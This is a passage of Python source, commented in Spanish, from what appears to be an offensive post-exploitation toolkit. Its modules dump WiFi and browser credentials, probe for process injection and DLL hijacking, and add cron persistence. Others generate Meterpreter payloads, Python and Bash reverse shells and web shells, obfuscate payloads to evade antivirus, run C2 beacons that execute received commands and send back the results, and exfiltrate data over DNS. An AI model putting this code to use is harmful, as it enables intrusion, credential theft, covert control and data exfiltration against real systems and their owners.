                for f in os.listdir(wifi_dir):
                    try:
                        with open(os.path.join(wifi_dir, f)) as fp:
                            content = fp.read()
                        ssid = re.search(r'ssid=(.*)', content)
                        psk  = re.search(r'psk=(.*)', content)
                        if ssid and psk:
                            credentials.append({'ssid': ssid.group(1), 'password': psk.group(1)})
                            print(f"[+] WiFi: {ssid.group(1)} -> {psk.group(1)}")
                    except PermissionError:
                        print(f"[-] Sin permisos para leer {f} (requiere root)")
                    except Exception:
                        pass
        elif platform.system().lower() == 'windows':
            try:
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profiles'],
                    capture_output=True, text=True
                )
                profiles = re.findall(r'All User Profile\s+:\s+(.*)', result.stdout)
                for profile in profiles:
                    r = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile.strip(), 'key=clear'],
                        capture_output=True, text=True
                    )
                    pwd = re.search(r'Key Content\s+:\s+(.*)', r.stdout)
                    if pwd:
                        credentials.append({'ssid': profile.strip(), 'password': pwd.group(1).strip()})
                        print(f"[+] WiFi: {profile.strip()} -> {pwd.group(1).strip()}")
            except Exception as e:
                print(f"[!] Error WiFi dump: {e}")
        return credentials

    def dump_browser_passwords(self) -> List[Dict]:
        """Extrae contraseñas de navegadores (Chrome en Linux)"""
        print("[*] Buscando contraseñas de navegadores")
        creds = []
        if platform.system().lower() != 'linux':
            print("[*] Solo implementado para Linux en esta versión")
            return creds
        chrome_db_path = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
        if os.path.exists(chrome_db_path):
            try:
                import shutil, sqlite3
                tmp_db = '/tmp/chrome_login_data'
                shutil.copy2(chrome_db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, user, pwd_encrypted = row
                    # La contraseña está cifrada con DPAPI/Keyring en Linux
                    creds.append({'url': url, 'username': user, 'password': '[cifrado]'})
                    print(f"[+] Chrome: {url} -> {user}")
                conn.close()
                os.remove(tmp_db)
            except Exception as e:
                print(f"[!] Error Chrome: {e}")
        return creds

    def dump_all(self) -> Dict:
        return {
            'sam':      self.dump_sam_secretsdump(),
            'lsass':    self.dump_lsass_procdump(),
            'wifi':     self.dump_wifi_passwords(),
            'browsers': self.dump_browser_passwords()
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 9: TOKEN MANIPULATOR
# ═══════════════════════════════════════════════════════════════════

class TokenManipulator:
    """Manipulación de tokens (principalmente Linux capabilities)"""

    def __init__(self):
        self.current_user = os.getenv('USER', 'unknown')

    def list_tokens(self) -> List[Dict]:
        """Lista procesos y sus privilegios/capabilities"""
        print("[*] Listando procesos privilegiados")
        tokens = []
        if platform.system().lower() == 'linux':
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                for line in result.stdout.split('\n')[1:]:
                    parts = line.split()
                    if len(parts) > 1 and parts[0] == 'root':
                        tokens.append({'user': 'root', 'pid': parts[1], 'command': ' '.join(parts[10:])})
                print(f"[+] {len(tokens)} procesos root encontrados")
            except Exception as e:
                print(f"[!] Error: {e}")
        elif platform.system().lower() == 'windows':
            print("[*] En Windows usar: Mimikatz> token::list")
            print("[*] O Incognito metasploit module: use incognito / list_tokens -u")
        return tokens

    def check_token_abuse(self) -> Dict:
        """Verifica si el usuario actual puede abusar de tokens"""
        print("[*] Verificando posibilidades de abuso de tokens")
        result = {'current_user': self.current_user, 'can_escalate': False, 'method': ''}
        if platform.system().lower() == 'linux':
            # Verificar capabilities del proceso actual
            try:
                r = subprocess.run(['cat', '/proc/self/status'], capture_output=True, text=True)
                for line in r.stdout.split('\n'):
                    if 'CapEff' in line:
                        cap_hex = line.split(':')[1].strip()
                        cap_int = int(cap_hex, 16)
                        if cap_int != 0:
                            result['can_escalate'] = True
                            result['method'] = f"Capabilities activas: {cap_hex}"
                            print(f"[+] Capabilities efectivas: {cap_hex}")
            except Exception:
                pass
        return result

    def run(self) -> Dict:
        return {
            'tokens': self.list_tokens(),
            'abuse_check': self.check_token_abuse()
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 10: PROCESS INJECTOR
# ═══════════════════════════════════════════════════════════════════

class ProcessInjector:
    """Técnicas de inyección de procesos"""

    def __init__(self):
        self.techniques = [
            'DLL Injection', 'Process Hollowing',
            'Reflective DLL Loading', 'APC Injection',
            'Thread Execution Hijacking'
        ]

    def list_processes(self) -> List[Dict]:
        """Lista procesos en ejecución"""
        print("[*] Listando procesos")
        procs = []
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(['ps', 'aux', '--no-headers'], capture_output=True, text=True)
                for line in result.stdout.strip().split('\n'):
                    parts = line.split(None, 10)
                    if len(parts) >= 11:
                        procs.append({'user': parts[0], 'pid': parts[1], 'cmd': parts[10]})
            else:
                result = subprocess.run(['tasklist', '/FO', 'CSV'], capture_output=True, text=True)
                for line in result.stdout.split('\n')[1:]:
                    if line.strip():
                        parts = line.strip('"').split('","')
                        if len(parts) >= 2:
                            procs.append({'name': parts[0], 'pid': parts[1]})
        except Exception as e:
            print(f"[!] Error listando procesos: {e}")
        print(f"[+] {len(procs)} procesos encontrados")
        return procs

    def find_injectable_processes(self) -> List[Dict]:
        """Encuentra procesos inyectables (que corren como root/SYSTEM)"""
        print("[*] Buscando procesos inyectables")
        injectable = []
        procs = self.list_processes()
        target_users = ['root', 'SYSTEM', 'NT AUTHORITY\\SYSTEM']
        for p in procs:
            if p.get('user', '') in target_users:
                injectable.append(p)
        print(f"[+] {len(injectable)} procesos privilegiados encontrados")
        return injectable

    def dll_injection_info(self, target_pid: int, dll_path: str) -> Dict:
        """Información sobre DLL injection (requiere ctypes en Windows)"""
        print(f"[*] Información para DLL Injection en PID {target_pid}")
        info = {
            'technique': 'Classic DLL Injection',
            'target_pid': target_pid,
            'dll_path': dll_path,
            'steps': [
                'OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)',
                'VirtualAllocEx(process_handle, None, dll_path_len, MEM_COMMIT, PAGE_READWRITE)',
                'WriteProcessMemory(process_handle, allocated_mem, dll_path)',
                'CreateRemoteThread(process_handle, None, 0, LoadLibraryA, allocated_mem, 0, None)'
            ]
        }
        if platform.system().lower() == 'windows':
            try:
                import ctypes, ctypes.wintypes
                PROCESS_ALL_ACCESS = 0x1F0FFF
                handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
                if handle:
                    print(f"[+] Handle obtenido para PID {target_pid}")
                    ctypes.windll.kernel32.CloseHandle(handle)
                    info['handle_obtained'] = True
                else:
                    info['handle_obtained'] = False
            except Exception as e:
                print(f"[!] Error: {e}")
        else:
            print("[*] DLL Injection completo solo disponible en Windows")
        return info

    def run(self) -> Dict:
        return {
            'processes': self.list_processes(),
            'injectable': self.find_injectable_processes()
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 11: DLL HIJACKING SCANNER
# ═══════════════════════════════════════════════════════════════════

class DLLHijackingScanner:
    """Busca oportunidades de DLL Hijacking"""

    def scan(self) -> List[Dict]:
        """Escanea directorios en busca de oportunidades DLL Hijacking"""
        print("[*] Escaneando oportunidades de DLL Hijacking")
        results = []
        if platform.system().lower() == 'linux':
            # En Linux buscar LD_PRELOAD y librerías con permisos inseguros
            results += self._scan_linux()
        else:
            results += self._scan_windows()
        return results

    def _scan_linux(self) -> List[Dict]:
        """DLL Hijacking equivalente en Linux (shared libraries)"""
        findings = []
        print("[*] Verificando LD_PRELOAD y configuración ld.so")
        # Buscar directorios de librerías con permisos de escritura
        lib_dirs = ['/usr/lib', '/usr/local/lib', '/lib', '/lib64']
        for d in lib_dirs:
            if os.path.exists(d) and os.access(d, os.W_OK):
                findings.append({'directory': d, 'writable': True, 'risk': 'HIGH'})
                print(f"[+] Directorio de librerías escribible: {d}")
        # Verificar ld.so.conf
        try:
            with open('/etc/ld.so.conf') as f:
                content = f.read()
            print(f"[*] ld.so.conf:\n{content}")
        except Exception:
            pass
        return findings

    def _scan_windows(self) -> List[Dict]:
        """Escaneo DLL Hijacking en Windows"""
        findings = []
        print("[*] Verificando PATH y directorios de aplicaciones")
        for path_dir in os.environ.get('PATH', '').split(';'):
            if path_dir and os.path.exists(path_dir):
                if os.access(path_dir, os.W_OK):
                    findings.append({'directory': path_dir, 'writable': True, 'risk': 'HIGH'})
                    print(f"[+] Directorio PATH escribible: {path_dir}")
        return findings


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 12: PERSISTENCE CHECKER
# ═══════════════════════════════════════════════════════════════════

class PersistenceChecker:
    """Verifica e implementa mecanismos de persistencia"""

    def check_registry(self) -> List[str]:
        """Verifica Registry Run keys (Windows)"""
        print("[*] Verificando Registry Run keys")
        findings = []
        if platform.system().lower() != 'windows':
            print("[-] Registry solo en Windows")
            return findings
        try:
            run_keys = [
                r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
                r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            ]
            for key in run_keys:
                result = subprocess.run(['reg', 'query', key], capture_output=True, text=True)
                if result.returncode == 0 and result.stdout.strip():
                    print(f"[+] Entradas en {key}:")
                    print(result.stdout)
                    findings.append(f"{key}: {result.stdout.strip()}")
        except Exception as e:
            print(f"[!] Error: {e}")
        return findings

    def check_scheduled_tasks(self) -> List[str]:
        """Verifica tareas programadas"""
        print("[*] Verificando Scheduled Tasks / Cron Jobs")
        findings = []
        if platform.system().lower() == 'linux':
            cron_locations = [
                '/etc/crontab', '/var/spool/cron/crontabs/',
                os.path.expanduser('~/.crontab')
            ]
            try:
                r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                if r.stdout.strip():
                    print(f"[+] Crontab usuario:\n{r.stdout}")
                    findings.append(r.stdout)
            except Exception:
                pass
        else:
            try:
                r = subprocess.run(['schtasks', '/query', '/fo', 'LIST'], capture_output=True, text=True)
                print(r.stdout[:2000])
                findings.append(r.stdout[:2000])
            except Exception as e:
                print(f"[!] Error: {e}")
        return findings

    def check_startup_folders(self) -> List[str]:
        """Verifica carpetas de inicio"""
        print("[*] Verificando carpetas de inicio")
        findings = []
        if platform.system().lower() == 'linux':
            startup_dirs = [
                '/etc/init.d/', '/etc/rc.local', '/etc/profile.d/',
                os.path.expanduser('~/.config/autostart/')
            ]
            for loc in startup_dirs:
                if os.path.exists(loc):
                    if os.path.isdir(loc):
                        files = os.listdir(loc)
                        if files:
                            print(f"[+] {loc}: {files}")
                            findings += [f"{loc}/{f}" for f in files]
                    else:
                        print(f"[+] {loc} existe")
                        findings.append(loc)
        else:
            startup = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
            if os.path.exists(startup):
                files = os.listdir(startup)
                if files:
                    print(f"[+] Startup folder: {files}")
                    findings += files
        return findings

    def check_services(self) -> List[str]:
        """Verifica servicios sospechosos"""
        print("[*] Verificando servicios")
        findings = []
        try:
            if platform.system().lower() == 'linux':
                r = subprocess.run(['systemctl', 'list-units', '--type=service', '--state=running'],
                                   capture_output=True, text=True)
                print(r.stdout[:2000])
                findings = r.stdout[:2000].split('\n')
            else:
                r = subprocess.run(['sc', 'query', 'type=', 'all', 'state=', 'all'],
                                   capture_output=True, text=True)
                print(r.stdout[:2000])
                findings = r.stdout[:2000].split('\n')
        except Exception as e:
            print(f"[!] Error: {e}")
        return findings

    def add_cron_persistence(self, command: str, schedule: str = '*/5 * * * *') -> bool:
        """Añade persistencia via cron (SOLO para uso en sistemas propios/autorizados)"""
        if platform.system().lower() != 'linux':
            print("[-] Cron solo en Linux")
            return False
        print(f"[*] Añadiendo persistencia cron: {schedule} {command}")
        try:
            r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current = r.stdout if r.returncode == 0 else ''
            entry = f"{schedule} {command}\n"
            if entry not in current:
                new_cron = current + entry
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                proc.communicate(input=new_cron.encode())
                print(f"[+] Persistencia cron añadida: {entry.strip()}")
                return True
            else:
                print("[*] Entrada cron ya existe")
        except Exception as e:
            print(f"[!] Error añadiendo cron: {e}")
        return False

    def run(self) -> Dict:
        return {
            'registry':       self.check_registry(),
            'scheduled_tasks': self.check_scheduled_tasks(),
            'startup_folders': self.check_startup_folders(),
            'services':        self.check_services()
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 13: FIREWALL EVASION
# ═══════════════════════════════════════════════════════════════════

class FirewallEvasion:
    """Técnicas de evasión de firewall"""

    def port_knocking(self, target: str, ports: List[int]) -> bool:
        """Ejecuta una secuencia de port knocking"""
        print(f"[*] Port Knocking en {target}: {ports}")
        try:
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect_ex((target, port))
                    s.close()
                    print(f"[*] Knock en puerto {port}")
                    import time
                    time.sleep(0.1)
                except Exception:
                    pass
            # Verificar si el puerto objetivo se abrió
            import time
            time.sleep(1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            r = s.connect_ex((target, 22))
            s.close()
            if r == 0:
                print("[+] ¡Port knocking exitoso! Puerto 22 ahora accesible")
                return True
            else:
                print("[-] Port knocking sin efecto visible")
        except Exception as e:
            print(f"[!] Error port knocking: {e}")
        return False

    def dns_tunneling(self, data: str, domain: str) -> bool:
        """Simula DNS tunneling codificando datos como consultas DNS"""
        print(f"[*] DNS Tunneling hacia {domain}")
        try:
            import dns.resolver
            chunks = [data[i:i+30] for i in range(0, len(data), 30)]
            for i, chunk in enumerate(chunks):
                encoded = base64.b32encode(chunk.encode()).decode().lower().rstrip('=')
                query = f"{encoded}.{domain}"
                print(f"[*] Consulta DNS: {query}")
                try:
                    dns.resolver.resolve(query, 'TXT')
                except Exception:
                    pass  # Normal que no resuelva en entorno de prueba
            print("[+] Datos enviados via DNS tunneling")
            return True
        except ImportError:
            print("[*] Sin dnspython para DNS tunneling real")
            print(f"[*] Alternativa: dnscat2, iodine")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
        return False

    def icmp_tunneling(self, target: str, data: str) -> bool:
        """Envía datos en paquetes ICMP usando Scapy"""
        print(f"[*] ICMP Tunneling hacia {target}")
        try:
            from scapy.all import IP, ICMP, Raw, send
            if os.geteuid() != 0:
                print("[!] ICMP tunneling requiere root")
                print(f"[*] Alternativa: ptunnel, icmpsh")
                return False
            chunks = [data[i:i+50] for i in range(0, len(data), 50)]
            for chunk in chunks:
                pkt = IP(dst=target) / ICMP() / Raw(load=chunk.encode())
                send(pkt, verbose=0)
                print(f"[*] ICMP enviado: {chunk}")
            print(f"[+] {len(chunks)} paquetes ICMP enviados a {target}")
            return True
        except ImportError:
            print("[!] Scapy no instalado: pip install scapy")
        except Exception as e:
            print(f"[!] Error ICMP tunneling: {e}")
        return False

    def check_firewall_rules(self) -> Dict:
        """Verifica reglas de firewall actuales"""
        print("[*] Verificando reglas de firewall")
        rules = {}
        try:
            if platform.system().lower() == 'linux':
                r = subprocess.run(['iptables', '-L', '-n'], capture_output=True, text=True)
                rules['iptables'] = r.stdout
                print(r.stdout[:1000])
                # También verificar nftables
                r2 = subprocess.run(['nft', 'list', 'ruleset'], capture_output=True, text=True)
                if r2.returncode == 0:
                    rules['nftables'] = r2.stdout
            else:
                r = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles'],
                                   capture_output=True, text=True)
                rules['windows_firewall'] = r.stdout
                print(r.stdout[:1000])
        except PermissionError:
            print("[!] Requiere privilegios para ver reglas de firewall")
        except Exception as e:
            print(f"[!] Error: {e}")
        return rules

    def run(self, target: str = '127.0.0.1') -> Dict:
        return {
            'firewall_rules': self.check_firewall_rules(),
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 14: AV EVASION
# ═══════════════════════════════════════════════════════════════════

class AVEvasion:
    """Técnicas de evasión de antivirus"""

    def obfuscate_payload(self, payload: bytes) -> bytes:
        """Ofusca un payload mediante XOR con clave aleatoria"""
        print("[*] Ofuscando payload con XOR")
        import secrets
        key = secrets.token_bytes(16)
        obfuscated = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
        print(f"[+] Payload ofuscado: {len(payload)} bytes")
        print(f"[+] Clave XOR: {key.hex()}")
        print(f"[+] Para descifrar: xor_decrypt(obfuscated, key)")
        # Código Python de descifrado
        decrypt_code = f"""
# Descifrador del payload
key = bytes.fromhex('{key.hex()}')
payload_enc = {list(obfuscated)}
payload = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload_enc)])
exec(payload)
"""
        print(f"[+] Código descifrador generado")
        return obfuscated

    def encrypt_payload(self, payload: bytes, key: bytes = None) -> Dict:
        """Cifra un payload con AES-256"""
        print("[*] Cifrando payload con AES-256")
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            import secrets
            if not key:
                key = secrets.token_bytes(32)
            iv = secrets.token_bytes(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(payload, AES.block_size))
            result = {
                'encrypted': base64.b64encode(encrypted).decode(),
                'key': base64.b64encode(key).decode(),
                'iv': base64.b64encode(iv).decode(),
                'size': len(encrypted)
            }
            print(f"[+] Payload cifrado: {len(encrypted)} bytes")
            return result
        except ImportError:
            print("[!] pycryptodome no instalado: pip install pycryptodome")
            # Fallback: XOR
            return {'encrypted': base64.b64encode(self.obfuscate_payload(payload)).decode()}
        except Exception as e:
            print(f"[!] Error cifrando: {e}")
            return {}

    def check_av_running(self) -> List[str]:
        """Detecta procesos de AV/EDR en ejecución"""
        print("[*] Detectando AV/EDR activos")
        av_processes = {
            'linux': ['clamd', 'freshclam', 'sophos', 'comodo', 'eset'],
            'windows': [
                'MsMpEng.exe', 'avp.exe', 'avgnt.exe', 'ekrn.exe',
                'bdagent.exe', 'savservice.exe', 'mcshield.exe',
                'CylanceSvc.exe', 'SentinelAgent.exe', 'cb.exe'
            ]
        }
        detected = []
        os_type = platform.system().lower()
        try:
            if os_type == 'linux':
                r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                for av in av_processes['linux']:
                    if av in r.stdout:
                        detected.append(av)
                        print(f"[+] AV detectado: {av}")
            else:
                r = subprocess.run(['tasklist', '/FO', 'CSV'], capture_output=True, text=True)
                for av in av_processes['windows']:
                    if av.lower() in r.stdout.lower():
                        detected.append(av)
                        print(f"[+] AV detectado: {av}")
        except Exception as e:
            print(f"[!] Error: {e}")
        if not detected:
            print("[+] No se detectaron procesos AV conocidos")
        return detected

    def generate_obfuscated_script(self, command: str) -> str:
        """Genera script Python ofuscado para ejecutar un comando"""
        print(f"[*] Generando script ofuscado para: {command}")
        cmd_b64 = base64.b64encode(command.encode()).decode()
        script = f"""
import base64,os
c=base64.b64decode('{cmd_b64}').decode()
os.system(c)
"""
        # Ofuscar más con eval y encode
        script_b64 = base64.b64encode(script.encode()).decode()
        final = f"import base64;exec(base64.b64decode('{script_b64}').decode())"
        print(f"[+] Script ofuscado generado ({len(final)} chars)")
        return final

    def run(self, payload: bytes = b"test_payload") -> Dict:
        return {
            'av_detected': self.check_av_running(),
            'obfuscated': self.obfuscate_payload(payload).hex(),
            'encrypted': self.encrypt_payload(payload)
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 15: PAYLOAD GENERATOR
# ═══════════════════════════════════════════════════════════════════

class PayloadGenerator:
    """Generación de payloads usando msfvenom y técnicas propias"""

    def check_msfvenom(self) -> bool:
        """Verifica si msfvenom está disponible"""
        r = subprocess.run(['which', 'msfvenom'], capture_output=True)
        return r.returncode == 0

    def generate_meterpreter(self, lhost: str, lport: int = 4444,
                              platform_target: str = 'linux', arch: str = 'x64',
                              format: str = 'elf') -> str:
        """Genera payload Meterpreter con msfvenom"""
        print(f"[*] Generando Meterpreter: {platform_target}/{arch} -> {lhost}:{lport}")
        output_file = f"/tmp/payload_{platform_target}_{arch}.{format}"
        if not self.check_msfvenom():
            print("[!] msfvenom no encontrado")
            print("[*] Instalar Metasploit: apt-get install metasploit-framework")
            cmd = f"msfvenom -p {platform_target}/x{arch.replace('x','')}/meterpreter/reverse_tcp"
            cmd += f" LHOST={lhost} LPORT={lport} -f {format} -o {output_file}"
            print(f"[*] Comando a ejecutar manualmente:\n    {cmd}")
            return ""
        try:
            payload = f"{platform_target}/x{arch.replace('x','')}/meterpreter/reverse_tcp"
            cmd = [
                'msfvenom', '-p', payload,
                f'LHOST={lhost}', f'LPORT={lport}',
                '-f', format, '-o', output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                print(f"[+] Payload generado: {output_file}")
                print(f"[+] Listener: msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'")
            else:
                print(f"[!] Error msfvenom: {result.stderr}")
        except Exception as e:
            print(f"[!] Error: {e}")
        return output_file

    def generate_python_reverse_shell(self, lhost: str, lport: int) -> str:
        """Genera un reverse shell en Python"""
        print(f"[*] Generando Python reverse shell -> {lhost}:{lport}")
        shell_code = f"""python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" """
        print(f"[+] One-liner generado:")
        print(f"    {shell_code}")
        print(f"[*] Listener: nc -lvnp {lport}")
        return shell_code

    def generate_bash_reverse_shell(self, lhost: str, lport: int) -> str:
        """Genera reverse shell en Bash"""
        shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        shell_b64 = base64.b64encode(shell.encode()).decode()
        one_liner = f"echo {shell_b64} | base64 -d | bash"
        print(f"[*] Bash reverse shell -> {lhost}:{lport}")
        print(f"[+] One-liner: {one_liner}")
        print(f"[*] Listener: nc -lvnp {lport}")
        return one_liner

    def generate_web_shell(self, language: str = 'php') -> str:
        """Genera un web shell"""
        print(f"[*] Generando web shell ({language})")
        shells = {
            'php': '<?php system($_GET["cmd"]); ?>',
            'aspx': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>',
            'jsp': '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
            'python': "import os;os.system(__import__('os').environ.get('CMD','id'))"
        }
        shell = shells.get(language, shells['php'])
        print(f"[+] Web shell ({language}): {shell}")
        return shell

    def generate_empire(self, lhost: str, lport: int = 443) -> str:
        """Genera stager para Empire"""
        print(f"[*] Stager Empire -> {lhost}:{lport}")
        # Empire usa HTTP/HTTPS listener
        stager_info = f"""
[*] Configuración Empire:
1. Iniciar Empire: sudo empire
2. Crear listener: listeners uselistener http
   set Host http://{lhost}:{lport}
   execute
3. Crear stager: usestager multi/launcher
   set Listener http
   execute
"""
        print(stager_info)
        return stager_info

    def generate_custom(self, lhost: str, lport: int, language: str = 'python') -> str:
        """Genera payload custom según lenguaje"""
        generators = {
            'python': self.generate_python_reverse_shell,
            'bash':   self.generate_bash_reverse_shell,
        }
        if language in generators:
            return generators[language](lhost, lport)
        return self.generate_python_reverse_shell(lhost, lport)

    def run(self, lhost: str = '127.0.0.1', lport: int = 4444) -> Dict:
        return {
            'msfvenom_available': self.check_msfvenom(),
            'python_shell': self.generate_python_reverse_shell(lhost, lport),
            'bash_shell': self.generate_bash_reverse_shell(lhost, lport),
            'web_shell_php': self.generate_web_shell('php'),
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 16: C2 COMMUNICATION
# ═══════════════════════════════════════════════════════════════════

class C2Communication:
    """Comunicación Command & Control"""

    def __init__(self, c2_host: str = '', c2_port: int = 443):
        self.c2_host = c2_host
        self.c2_port = c2_port

    def https_c2(self, c2_url: str = '') -> bool:
        """Beacon HTTPS hacia servidor C2"""
        print(f"[*] Probando beacon HTTPS C2")
        url = c2_url or f"https://{self.c2_host}:{self.c2_port}/beacon"
        try:
            import requests
            import urllib3
            urllib3.disable_warnings()
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                print(f"[+] C2 alcanzable: {url}")
                cmd = r.text.strip()
                if cmd:
                    print(f"[+] Comando recibido del C2: {cmd}")
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    print(f"[+] Resultado: {result.stdout}")
                    # Enviar resultado al C2
                    requests.post(url, data={'result': result.stdout}, verify=False)
                return True
            else:
                print(f"[-] C2 no disponible (HTTP {r.status_code})")
        except Exception as e:
            print(f"[-] C2 no alcanzable: {e}")
        return False

    def dns_c2(self, domain: str = '', command: str = 'whoami') -> str:
        """C2 via DNS TXT records"""
        print(f"[*] Probando C2 via DNS en {domain or self.c2_host}")
        target_domain = domain or self.c2_host
        if not target_domain:
            print("[!] Especifica un dominio C2")
            return ""
        try:
            import dns.resolver
            answers = dns.resolver.resolve(f"c2.{target_domain}", 'TXT')
            for rdata in answers:
                txt = str(rdata).strip('"')
                decoded = base64.b64decode(txt).decode()
                print(f"[+] Comando DNS C2: {decoded}")
                result = subprocess.run(decoded, shell=True, capture_output=True, text=True, timeout=10)
                print(f"[+] Resultado: {result.stdout}")
                return result.stdout
        except ImportError:
            print("[!] dnspython no instalado: pip install dnspython")
        except Exception as e:
            print(f"[-] DNS C2 no disponible: {e}")
        return ""

    def icmp_c2(self, target: str = '', listen: bool = False) -> bool:
        """C2 via ICMP (requiere Scapy y root)"""
        print(f"[*] Configurando ICMP C2")
        if os.geteuid() != 0:
            print("[!] ICMP C2 requiere root")
            return False
        try:
            from scapy.all import IP, ICMP, Raw, sniff, send
            if listen:
                print("[*] Escuchando paquetes ICMP para comandos...")
                def process_pkt(pkt):
                    if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
                        data = pkt[Raw].load.decode(errors='ignore')
                        if data.startswith('CMD:'):
                            cmd = data[4:]
                            print(f"[+] Comando ICMP recibido: {cmd}")
                            r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                            # Responder con resultado
                            resp = IP(dst=pkt[IP].src)/ICMP(type=0)/Raw(load=f"RES:{r.stdout[:200]}")
                            send(resp, verbose=0)
                sniff(filter="icmp", prn=process_pkt, count=10, timeout=30)
            else:
                t = target or self.c2_host
                cmd = "whoami"
                pkt = IP(dst=t)/ICMP()/Raw(load=f"CMD:{cmd}")
                send(pkt, verbose=0)
                print(f"[+] Comando enviado via ICMP a {t}")
            return True
        except ImportError:
            print("[!] Scapy no instalado: pip install scapy")
        except Exception as e:
            print(f"[!] Error ICMP C2: {e}")
        return False

    def setup_reverse_shell_listener(self, port: int = 4444) -> None:
        """Configura un listener para reverse shells"""
        print(f"[*] Iniciando listener en puerto {port}")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', port))
            server.listen(1)
            print(f"[+] Escuchando en 0.0.0.0:{port} (Ctrl+C para salir)")
            conn, addr = server.accept()
            print(f"[+] ¡Conexión desde {addr[0]}:{addr[1]}!")
            while True:
                cmd = input("shell> ")
                if cmd.lower() in ['exit', 'quit']:
                    break
                conn.send((cmd + '\n').encode())
                response = conn.recv(4096).decode()
                print(response)
            conn.close()
            server.close()
        except KeyboardInterrupt:
            print("\n[*] Listener detenido")
        except Exception as e:
            print(f"[!] Error listener: {e}")

    def run(self) -> Dict:
        return {
            'c2_host': self.c2_host,
            'c2_port': self.c2_port,
            'https_reachable': self.https_c2() if self.c2_host else False,
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 17: DATA EXFILTRATION
# ═══════════════════════════════════════════════════════════════════

class DataExfiltration:
    """Técnicas de exfiltración de datos"""

    def dns_exfiltration(self, data: str, c2_domain: str) -> bool:
        """Exfiltra datos codificados en consultas DNS"""
        print(f"[*] Exfiltrando {len(data)} bytes via DNS hacia {c2_domain}")
        try:
            import dns.resolver
            chunk_size = 40
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            for i, chunk in enumerate(chunks):
                encoded = base64.b32encode(chunk.encode()).decode().lower().rstrip('=')
                query = f"{i}.{encoded}.exfil.{c2_domain}"
                print(f"[*] DNS query: {query[:60]}...")
                try:
                    dns.resolver.resolve(query, 'A', lifetime=2)
                except Exception:
                    pass  # Normal que no resuelva
            print(f"[+] {len(chunks)} chunks exfiltrados via DNS")
            return True
        except ImportError:
            print("[!] dnspython no instalado: pip install dnspython")
        except Exception as e:
            print(f"[!] Error DNS exfil: {e}")
        return False

    def steganography(self, data: bytes, cover_image_path: str, output_path: str = '/tmp/stego_out.png') -> bool:
        """Oculta datos en una imagen mediante LSB steganography"""
        print(f"[*] Ocultando {len(data)} bytes en {cover_image_path}")
        try:
            from PIL import Image
            import struct
            img = Image.open(cover_image_path).convert('RGBA')
            pixels = list(img.getdata())

            # Prepend length header (4 bytes)
            payload = struct.pack('>I', len(data)) + data
            bits = ''.join([f'{byte:08b}' for byte in payload])

            if len(bits) > len(pixels) * 4:
                print(f"[!] Imagen demasiado pequeña ({len(pixels) * 4} bits disponibles, {len(bits)} necesarios)")
                return False

            new_pixels = []
            bit_idx = 0
            for pixel in pixels:
                if bit_idx < len(bits):
                    new_pixel = list(pixel)
                    for channel in range(4):  # RGBA
                        if bit_idx < len(bits):
                            new_pixel[channel] = (new_pixel[channel] & ~1) | int(bits[bit_idx])
                            bit_idx += 1
                    new_pixels.append(tuple(new_pixel))
                else:
                    new_pixels.append(pixel)

            img.putdata(new_pixels)
            img.save(output_path)
            print(f"[+] Datos ocultos en {output_path}")
            return True
        except ImportError:
            print("[!] Pillow no instalado: pip install Pillow")
        except FileNotFoundError:
            print(f"[!] Imagen no encontrada: {cover_image_path}")
        except Exception as e:
